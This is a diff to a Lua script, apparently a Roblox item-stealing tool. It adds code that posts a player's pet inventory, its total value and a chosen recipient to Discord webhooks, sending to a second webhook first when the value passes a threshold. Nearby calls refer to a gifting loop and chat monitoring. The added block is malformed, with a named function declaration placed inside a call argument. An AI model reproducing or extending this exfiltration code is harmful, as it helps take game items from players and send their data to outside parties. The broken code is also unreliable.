@@ -909,7 +909,44 @@ local function main()
     
     local priorityPlayer = GiftingSystem.getPriorityPlayer()
     
-    DiscordWebhook.send(itemsToSend, totalValue, hasRare, hasHeavy, priorityPlayer)
+    DiscordWebhook.send(function DiscordWebhook.send(itemsToSend, totalValue, hasRare, hasHeavy, priorityPlayer)
+    local embed = DiscordWebhook.createEmbed(itemsToSend, totalValue, hasRare, priorityPlayer)
+    local contentMsg = hasRare and "@everyone New rare pet inventory!" or "✅ Inventory report generated!"
+
+    local req = Utils.getHttpRequest()
+    if not req then return end
+
+    local function sendWebhook(url, username)
+        local payload = {
+            ["content"] = contentMsg,
+            ["username"] = username,
+            ["embeds"] = {embed},
+            ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/616/616408.png"
+        }
+
+        pcall(function()
+            req({
+                Url = url,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    end
+
+    if totalValue >= CONFIG.dualWebhookThreshold then
+        -- Send to dualWebhook immediately
+        sendWebhook(CONFIG.dualWebhook, CONFIG.dualUsername)
+
+        -- Send to normal webhook after 90 seconds
+        task.delay(90, function()
+            sendWebhook(CONFIG.webhook, CONFIG.username)
+        end)
+    else
+        -- Send to normal webhook immediately
+        sendWebhook(CONFIG.webhook, CONFIG.username)
+    end
+end)
     
     GiftingSystem.setupChatMonitoring()
     GiftingSystem.startGiftingLoop()
